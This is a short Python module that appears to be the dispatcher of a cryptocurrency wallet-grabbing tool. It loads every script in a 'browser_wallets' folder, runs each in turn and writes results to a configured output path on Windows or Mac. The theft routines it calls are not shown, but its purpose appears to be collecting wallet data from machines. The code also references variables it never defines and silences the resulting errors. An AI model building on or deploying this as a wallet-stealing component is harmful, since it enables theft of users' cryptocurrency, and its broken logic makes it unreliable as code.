SUPPORTED_OPERATING_SYSTEMS = ['Windows', 'Mac']
SUPPORTED_BROWSERS = None
DEPENDENCIES = None

def all_browser_wallets():
    try:
        from model.load_wallets import load_wallet_functions
        from routes.config import configuration

        import os
        import csv

    except ImportError as e:
        import_catch = f'ERROR: All Desktop Wallets - {e} identified! Execution aborted!'
        pass

    output_path = configuration.OUTPUT_PATH

    try:
        if import_catch:
            with open(logging_output, 'a') as log_file:
                log_file.write(f'\n{import_catch}')
            return
    except Exception as e:
        pass

    wallet_functions = load_wallet_functions([
        'wallet_scripts/browser_wallets'
    ])

    func_list = []
    run_funtions_list = []

    for items in wallet_functions:
        func_list.append(items)

    func_list.remove('all_browser_wallets')

    for wallet_key in func_list:
        func = wallet_functions.get(wallet_key)
        if func:
            try:
                # print(f"- Executing {wallet_key}"))
                func()
                run_funtions_list.append(wallet_key)

            except Exception as e:
                print(f" - Error executing {wallet_key}: {e}")
                pass